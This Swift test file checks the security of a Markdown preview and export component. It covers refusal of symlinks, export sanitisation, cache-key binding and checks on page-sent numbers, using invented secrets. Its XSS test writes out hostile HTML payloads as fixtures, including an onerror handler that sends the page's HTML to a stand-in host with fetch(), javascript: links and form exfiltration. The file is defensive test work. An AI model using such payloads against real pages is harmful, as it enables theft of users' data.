import XCTest
import WebKit
import Darwin
@testable import VitrinePreviewKit
import VitrineText

/// S-16, lane 2: the Markdown page, its export and the files a page may read, attacked with invented files in temp
/// folders. F1 (export carries event handlers), F10 (export inlines a symlink's target), F14 (the vitrine://doc/
/// handler follows symlinks), F52 (the page chose the Mermaid cache key), F53 (tocWidth's Int(Double) trap).
/// roadmap: S-16
@MainActor
final class S16WebMarkdownTests: XCTestCase {
    private var folders: [URL] = []
    override func tearDown() {
        for f in folders { try? FileManager.default.removeItem(at: f) }
        folders = []
        super.tearDown()
    }

    private func folder(_ tag: String = "doc") throws -> URL {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("vt-s16-\(tag)-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        folders.append(dir)
        return dir
    }

    /// A 4×4 PNG, drawn here.
    private func png() throws -> Data {
        let pixel = NSImage(size: NSSize(width: 4, height: 4))
        pixel.lockFocus(); NSColor.systemTeal.setFill(); NSRect(x: 0, y: 0, width: 4, height: 4).fill(); pixel.unlockFocus()
        let rep = NSBitmapImageRep(data: try XCTUnwrap(pixel.tiffRepresentation))
        return try XCTUnwrap(rep?.representation(using: .png, properties: [:]))
    }

    private let suite = "vt-s16-web-suite"
    private func context(_ dir: URL) -> RenderContext {
        RenderContext(appearance: .light, defaultsSuite: suite, cachesDirectory: dir.appendingPathComponent("caches"))
    }

    /// A Markdown preview in an off-screen window, as the Vitrine window holds it.
    private func markdown(_ text: String, in dir: URL) async throws -> (MarkdownRenderer, RenderedPreview, NSWindow) {
        let url = dir.appendingPathComponent("Readme.md")
        try text.write(to: url, atomically: true, encoding: .utf8)
        let renderer = MarkdownRenderer()
        let preview = try await renderer.render(url: url, kind: .markdown(.commonMark), context: context(dir))
        let window = NSWindow(contentRect: NSRect(x: -30_000, y: -30_000, width: 900, height: 700), styleMask: [.borderless], backing: .buffered, defer: false)
        preview.view.frame = NSRect(x: 0, y: 0, width: 900, height: 700)
        window.contentView = preview.view
        window.orderFrontRegardless()
        try await Task.sleep(for: .milliseconds(400))
        return (renderer, preview, window)
    }

    private func waitForMermaid(_ renderer: MarkdownRenderer) async throws {
        for _ in 0..<300 {
            if renderer.lastMermaidTiming != nil { return }
            try await Task.sleep(for: .milliseconds(50))
        }
        XCTFail("mermaid did not report within 15 s")
    }

    // MARK: F14 — the scheme handler

    /// A symlink beside the document, to a file outside its folder, is refused; so is a link in a middle component,
    /// a FIFO, a folder and a missing file. A plain file and a link that stays inside are served.
    func testF14SchemeHandlerRefusesLinksOutDevicesAndFolders() throws {
        let doc = try folder(), outside = try folder("outside")
        let secret = outside.appendingPathComponent("id_rsa")
        try Data("-----BEGIN INVENTED KEY----- s16".utf8).write(to: secret)
        let fm = FileManager.default
        try fm.createSymbolicLink(at: doc.appendingPathComponent("secret.png"), withDestinationURL: secret)
        try fm.createSymbolicLink(atPath: doc.appendingPathComponent("assets").path, withDestinationPath: outside.path)   // a folder link
        try fm.createSymbolicLink(atPath: doc.appendingPathComponent("up").path, withDestinationPath: "..")                // relative, like `assets -> ../..`
        try fm.createDirectory(at: doc.appendingPathComponent("img"), withIntermediateDirectories: true)
        try png().write(to: doc.appendingPathComponent("img/tide.png"))
        try fm.createSymbolicLink(at: doc.appendingPathComponent("alias.png"), withDestinationURL: doc.appendingPathComponent("img/tide.png"))
        XCTAssertEqual(mkfifo(doc.appendingPathComponent("pipe.png").path, 0o600), 0)

        let h = PreviewSchemeHandler(documentRoot: doc)
        let u = { (p: String) in URL(string: "vitrine://doc/" + p)! }
        XCTAssertNil(h.resolve(u("secret.png")), "a link to a file outside the folder")
        XCTAssertNil(h.resolve(u("assets/id_rsa")), "a link in a middle component")
        XCTAssertNil(h.resolve(u("up/\(outside.lastPathComponent)/id_rsa")), "a relative link up and over")
        XCTAssertNil(h.resolve(u("pipe.png")), "a FIFO")
        XCTAssertNil(h.resolve(u("img")), "a folder")
        XCTAssertNil(h.resolve(u("missing.png")), "a missing file")
        XCTAssertNotNil(h.resolve(u("img/tide.png")), "a plain picture beside the document")
        XCTAssertNotNil(h.resolve(u("alias.png")), "a link that stays inside the folder")
    }

    /// End to end: the page itself cannot load the linked secret (the request fails), while the plain picture loads.
    func testF14ThePageCannotLoadALinkedSecret() async throws {
        let doc = try folder(), outside = try folder("outside")
        let secret = outside.appendingPathComponent("photo.png")
        try png().write(to: secret)   // a real picture, so only the link check can stop it
        try FileManager.default.createSymbolicLink(at: doc.appendingPathComponent("linked.png"), withDestinationURL: secret)
        try png().write(to: doc.appendingPathComponent("plain.png"))
        let (_, preview, window) = try await markdown("<img id=\"a\" src=\"linked.png\"> <img id=\"b\" src=\"plain.png\">\n", in: doc)
        defer { window.orderOut(nil) }
        let web = try XCTUnwrap(preview.view as? WKWebView)
        try await Task.sleep(for: .milliseconds(300))
        let linked = try await web.evaluateJavaScript("document.getElementById('a').naturalWidth") as? Int
        let plain = try await web.evaluateJavaScript("document.getElementById('b').naturalWidth") as? Int
        XCTAssertGreaterThan(plain ?? 0, 0, "the plain picture loads")
        XCTAssertEqual(linked, 0, "the linked picture outside the folder does not")
    }

    // MARK: F10 — export inlining

    func testF10ExportNeverInlinesALinkedFileFromOutsideTheFolder() async throws {
        let doc = try folder(), outside = try folder("outside")
        let secretBytes = Data("INVENTED-SECRET-S16-0123456789".utf8)
        try secretBytes.write(to: outside.appendingPathComponent("credentials"))
        let fm = FileManager.default
        try fm.createSymbolicLink(at: doc.appendingPathComponent("secret.png"), withDestinationURL: outside.appendingPathComponent("credentials"))
        try fm.createSymbolicLink(atPath: doc.appendingPathComponent("assets").path, withDestinationPath: outside.path)
        try png().write(to: doc.appendingPathComponent("tide.png"))
        let (renderer, _, window) = try await markdown("# Notes\n\n<img src=\"secret.png\"> <img src=\"assets/credentials\">\n\n![tide](tide.png)\n", in: doc)
        defer { window.orderOut(nil) }
        let html = try await renderer.exportHTML(title: "Readme.md")
        XCTAssertFalse(html.contains(secretBytes.base64EncodedString()), "the linked file's bytes are not in the export")
        XCTAssertFalse(html.contains(Data(secretBytes.prefix(18)).base64EncodedString().dropLast(4)), "not even a prefix of them")
        XCTAssertTrue(html.contains("src=\"data:image/png;base64,\(try png().base64EncodedString())\""), "the plain picture beside the file is still inside")
    }

    // MARK: F1 — export XSS

    func testF1ExportCarriesNoHandlersNoScriptURLsAndARestrictivePolicy() async throws {
        let doc = try folder()
        try png().write(to: doc.appendingPathComponent("tide.png"))
        let attack = """
        # Release notes

        <img src="tide.png" onerror="fetch('https://evil.invalid/'+document.documentElement.outerHTML)">
        <img src="x" onerror="alert(1)">
        <svg onload="alert(2)"><a href="javascript:alert(3)"><text>t</text></a><animate attributeName="href" to="javascript:alert(4)"/></svg>
        <a href="javascript:alert(5)">click</a> <a href=" JaVaScRiPt:alert(6)">two</a> <a href="https://example.invalid/ok">ok</a>
        <details open ontoggle="alert(7)"><summary>s</summary>d</details>
        <div style="background:url(https://evil.invalid/p.gif)">styled</div>
        <form action="https://evil.invalid"><button formaction="https://evil.invalid">go</button></form>
        <math><annotation-xml encoding="text/html"><img src=x onerror=alert(8)></annotation-xml></math>
        <object data="https://evil.invalid/x"></object><embed src="https://evil.invalid/y"><link rel="stylesheet" href="https://evil.invalid/s.css">
        """
        let (renderer, _, window) = try await markdown(attack, in: doc)
        defer { window.orderOut(nil) }
        let html = try await renderer.exportHTML(title: "Readme.md")
        let lower = html.lowercased()
        for banned in ["onerror", "onload", "ontoggle", "javascript:", "<script", "<iframe", "<object", "<embed", "<form", "<link",
                       "formaction", "evil.invalid", "<animate", "annotation-xml"] {
            var context = ""
            if let at = lower.range(of: banned) {
                let from = lower.index(at.lowerBound, offsetBy: -80, limitedBy: lower.startIndex) ?? lower.startIndex
                context = String(lower[from..<at.upperBound])
            }
            XCTAssertEqual(context, "", "the export carries no \(banned)")
        }
        // The policy: the first thing in <head> after the charset, no script, nothing fetched.
        let csp = try XCTUnwrap(html.range(of: "<meta http-equiv=\"Content-Security-Policy\" content=\""), "the export carries a CSP")
        XCTAssertLessThan(csp.lowerBound, try XCTUnwrap(html.range(of: "<style>")).lowerBound, "before any style")
        let policy = String(html[csp.upperBound...].prefix { $0 != "\"" })
        XCTAssertTrue(policy.contains("default-src 'none'"), policy)
        XCTAssertTrue(policy.contains("script-src 'none'"), policy)
        XCTAssertTrue(policy.contains("img-src data:"), policy)
        XCTAssertFalse(policy.contains("http") || policy.contains("*") || policy.contains("'unsafe-eval'"), policy)
        XCTAssertTrue(html.contains("href=\"https://example.invalid/ok\""), "an ordinary web link stays a link")
        XCTAssertTrue(html.contains("src=\"data:image/png;base64,"), "the picture beside the file is still embedded")
    }

    // MARK: F52 — Mermaid cache key

    func testF52ThePageCannotChooseOrRebindAMermaidCacheKey() async throws {
        let doc = try folder()
        let source = "flowchart LR\n  A[Plan] --> B[Ship]\n"
        let (renderer, _, window) = try await markdown("# D\n\n```mermaid\n\(source)```\n", in: doc)
        defer { window.orderOut(nil) }
        try await waitForMermaid(renderer)
        try await Task.sleep(for: .milliseconds(200))
        let cache = MermaidCache(directory: doc.appendingPathComponent("caches/mermaid"))
        let ctx = context(doc)
        let issued = MermaidBlocks.key(source: source, theme: MarkdownRenderer.theme(ctx).id,
                                       appearance: MarkdownRenderer.diagramAppearance(ctx).rawValue, mermaidVersion: MermaidCache.mermaidVersion)
        XCTAssertNotNil(cache.svg(for: issued), "the page's own drawing was saved under the key Swift issued")

        // A key Swift never issued (another document's diagram, worked out offline) is refused.
        let forged = MermaidBlocks.key(source: "graph TD; X-->Y\n", theme: "github", appearance: "light", mermaidVersion: MermaidCache.mermaidVersion)
        let fake = "<svg id=\"forged\"><text>Skip signature check</text></svg>"
        renderer.receive("mermaidSVG", ["body": ["key": forged, "source": "graph TD; X-->Y\n", "svg": fake]])
        renderer.receive("mermaidSVG", ["body": ["key": forged, "svg": fake]])
        XCTAssertNil(cache.svg(for: forged), "a key this page was not issued stores nothing")

        // The issued key with a different source (a raw-HTML block that copied the key) is refused too.
        renderer.receive("mermaidSVG", ["body": ["key": issued, "source": "graph TD; Evil-->Diagram\n", "svg": fake]])
        renderer.receive("mermaidSVG", ["body": ["key": issued, "svg": fake]])
        XCTAssertNotEqual(cache.svg(for: issued), fake, "an issued key is bound to the source it was issued for")
    }

    // MARK: F53 — tocWidth and the other numbers the page sends

    func testF53PageNumbersAreCheckedBeforeConversion() async throws {
        let doc = try folder()
        let (renderer, _, window) = try await markdown("# One\n\n## Two\n\n## Three\n\ntext\n", in: doc)
        defer { window.orderOut(nil) }
        let defaults = try XCTUnwrap(UserDefaults(suiteName: suite))
        defaults.removeObject(forKey: MarkdownRenderer.Keys.tocWidth)
        for hostile: Any in [Double.nan, Double.infinity, -Double.infinity, 1e23, -1e23, Double(Int.max), 99_999_999_999_999_999_999.0] {
            renderer.receive("tocWidth", ["body": hostile])
        }
        XCTAssertNil(defaults.object(forKey: MarkdownRenderer.Keys.tocWidth), "no hostile width was stored")
        renderer.receive("tocWidth", ["body": 5000.0])
        XCTAssertNil(defaults.object(forKey: MarkdownRenderer.Keys.tocWidth), "a width outside the column's range is ignored")
        renderer.receive("tocWidth", ["body": 250.0])
        XCTAssertEqual(defaults.integer(forKey: MarkdownRenderer.Keys.tocWidth), 250, "a real drag is remembered")
        renderer.receive("tocWidth", ["body": NSNumber(value: 300)])
        XCTAssertEqual(defaults.integer(forKey: MarkdownRenderer.Keys.tocWidth), 300)

        // Text size steps: only −1, 0 and +1 mean anything; a huge step must not overflow the index arithmetic.
        defaults.removeObject(forKey: MarkdownRenderer.Keys.textScale)
        for hostile: Any in [NSNumber(value: Double.nan), NSNumber(value: 1e300), NSNumber(value: -1e300), NSNumber(value: Int.max), NSNumber(value: Int.min), NSNumber(value: 2)] {
            renderer.receive("textScale", ["body": hostile])
        }
        XCTAssertNil(defaults.object(forKey: MarkdownRenderer.Keys.textScale), "no hostile step changed the size")
        renderer.receive("mermaidTiming", ["body": ["load": Double.nan, "first": 1e300, "total": -1e300, "count": Double.infinity]])
        XCTAssertEqual(renderer.lastMermaidTiming, .init(load: -1, first: -1, total: -1, count: -1), "nonsense timings read as unknown")
        defaults.removeObject(forKey: MarkdownRenderer.Keys.tocWidth)
    }
}
